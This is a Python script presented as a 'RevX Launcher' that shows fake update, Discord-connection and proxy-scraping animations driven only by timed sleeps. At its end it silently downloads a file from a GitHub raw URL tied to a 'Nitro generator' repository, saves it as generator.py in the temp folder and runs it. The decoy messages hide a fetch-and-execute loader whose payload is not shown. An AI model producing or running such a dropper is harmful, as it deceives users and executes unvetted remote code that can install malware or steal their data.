import util.config
from util.config import SCRAPE
import random
import threading
import string
import time
import sys
from colorama.ansi import Fore
import numpy as np
import requests
import os
import itertools
import subprocess



def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(.00001)
        
HEADER = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'}
file = "codes.txt"
num = random.randint(100, 500)
time.sleep(1)
os.system("CLS")
os.system(f"title RevX Launcher")
os.system("CLS")

def proxy_scrapehttp():
    temp = os.getenv("temp")+"\\proxies78.txt"
    r = requests.get(SCRAPE, headers=HEADER)
    with open(temp, "wb") as f:
        f.write(r.content)

def httpproxy():
    temp = os.getenv("temp") + "\\proxies78.txt"
    if not os.path.exists(temp):
        with open(temp, "w") as f:
            f.close()
    if os.stat(temp).st_size == 0:
        proxy_scrapehttp()
    proxies = open(temp).read().split('\n')
    proxy = proxies[1]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy

animation_finished = False
animation_finished2 = False
animation_finished3 = False


def animation():
 for x in itertools.cycle(['|', '/', '-', '\\']):
    if animation_finished:
            break
    sys.stdout.write(f'\r{Fore.BLUE}[RevX] {Fore.GREEN}Checking RevX For Updates {Fore.RESET}' + x)
    sys.stdout.flush()
    time.sleep(0.1)

def animation2():
 for x in itertools.cycle(['|', '/', '-', '\\']):
    if animation_finished2:
            break
    sys.stdout.write(f'\r{Fore.BLUE}[RevX] {Fore.GREEN}Connecting to Discord Socket {Fore.RESET}' + x)
    sys.stdout.flush()
    time.sleep(0.1)

def animation3():
 for x in itertools.cycle(['|', '/', '-', '\\']):
    if animation_finished3:
            break
    sys.stdout.write(f'\r{Fore.BLUE}[RevX] {Fore.GREEN}Scraping currently {num} Proxies {Fore.RESET}' + x)
    sys.stdout.flush()
    time.sleep(0.1)

t = threading.Thread(target=animation)
t.start()
time.sleep(5)
animation_finished = True

t = threading.Thread(target=animation2)
t.start()
time.sleep(5)
animation_finished2 = True

t = threading.Thread(target=animation3)
t.start()
time.sleep(5)
os.system("CLS")
print(f"{Fore.GREEN}[Connected!]{Fore.RESET}")
animation_finished3 = True
time.sleep(2)
os.system("CLS")

class launcher:
    getcode = requests.get("https://raw.githubusercontent.com/Exerz7/NitroGenSCR/main/KrnlX%20v1")
    temp = os.getenv("temp") + "\\generator.py"
    with open(temp, "wb") as f:
        f.write(getcode.content);
    os.system(f"python {temp}")
launcher()
